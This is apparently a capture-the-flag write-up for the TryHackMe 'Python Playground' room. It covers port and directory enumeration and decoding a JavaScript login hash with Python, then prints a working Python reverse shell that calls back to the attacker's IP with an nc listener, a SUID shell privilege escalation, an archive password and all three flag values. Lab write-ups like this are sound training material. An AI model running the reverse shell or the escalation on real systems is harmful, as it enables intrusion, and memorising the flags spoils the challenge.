
# 🐍 Python Playground - TryHackMe

> Be creative!  
> 🔗 [Python Playground Room](https://tryhackme.com/room/pythonplayground)

---

## 🧠 Topics

- ✅ Network Enumeration (Nmap)
- ✅ Web Enumeration (Gobuster)
- ✅ JavaScript Login Bypass Logic 
- ✅ Python Scripting (Decoder)  
- ✅ Misconfigured Binaries

---

## 🗂️ Appendix Archive

> **Password:** `1 kn0w 1 5h0uldn'7!`

---

## 🎯 Task 1: Hack it!

> *Jump in and grab those flags! All in the usual places: `/home/someuser`, `/root`*

<details>
<summary>🔍 Nmap Results</summary>

```bash
sudo nmap -A -sS -sC -sV -O 10.10.192.182
```

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 20:20 IST
Nmap scan report for 10.10.192.182
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)
|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)
|_  256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Python Playground!
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   239.31 ms 10.21.0.1
2   239.53 ms 10.10.192.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.97 seconds
```

🔗 [http://10.10.192.182](http://10.10.192.182)  
🔗 [http://10.10.192.182/login.html](http://10.10.192.182/login.html)  
🔗 [http://10.10.192.182/signup.html](http://10.10.192.182/signup.html)

</details>

---

<details>
<summary>📁 Gobuster Enumeration</summary>

```bash
gobuster dir -u http://10.10.192.182 -w /usr/share/dirb/wordlists/common.txt -x html
```

**Results:**
```
┌──(zenrage-a1105㉿ZenRage-A1105)-[~/thm]
└─$ gobuster dir -u http://10.10.192.182 -w /usr/share/dirb/wordlists/common.txt -x html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.192.182
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin.html           (Status: 200) [Size: 3134]
/index.html           (Status: 200) [Size: 941]
/index.html           (Status: 200) [Size: 941]
/login.html           (Status: 200) [Size: 549]
/signup.html          (Status: 200) [Size: 549]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================
 ```

🔗 [http://10.10.192.182/admin.html](http://10.10.192.182/admin.html)  
🔗 [View Source](view-source:http://10.10.192.182/admin.html)

</details>

---

<details>
<summary>🔐 JavaScript Login Bypass Logic</summary>

```js
const hash = int_array_to_text(
  string_to_int_array(
    int_array_to_text(string_to_int_array(password))
  )
);

if (hash === "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu")
  window.location = "super-secret-admin-testing-panel.html";
```

🔗 [http://10.10.251.33/super-secret-admin-testing-panel.html](http://10.10.251.33/super-secret-admin-testing-panel.html)
</details>

---

<details>
<summary>🧮 Python Decoder Logic</summary>

```python
def text_to_unicode(string):
    return [str(ord(c)-97) for c in string]

def unicode_to_text(string):
    out = ''
    for i in range(0, len(string), 2):
        out += chr(int(string[i])*26 + int(string[i+1]))
    return out

hash = "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"
print(unicode_to_text(text_to_unicode(unicode_to_text(text_to_unicode(hash)))))
```

✅ Password: `spaghetti1245`

</details>

---

<details>
<summary>💻 Reverse Shell</summary>

```python
import socket, os, subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.106.222",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

```bash
# Listener
nc -lnvp 9001
```

</details>

---

<details>
<summary>📜 Flag Dump</summary>

### 🏁 Flag 1 (root):
```bash
cat /root/flag1.txt
```
`THM{7e0b5cf043975e3c104a458a8d4f6f2f}`

---

### 🏁 Flag 2 (connor):
```bash
cat /home/connor/flag2.txt
```
`THM{69a36d6f9da10d23ca0dbfdf6e691ec5}`

---

### 🏁 Flag 3 (via SUID shell):
```bash
/var/log/sh -p
cd /root
cat flag3.txt
```
`THM{be3adc69c25ad14eb79da4eb57925ad1}`

</details>

## 🧠 Tips

- Use `<details>` and `<summary>` in `.md` to make content collapsible  
- Render this using **Markdown Preview Enhanced**, **Obsidian**, or static site generators for best effects  
- For interactivity, embed `copy.js`, `highlight.js`, or use GitHub Pages with custom JS
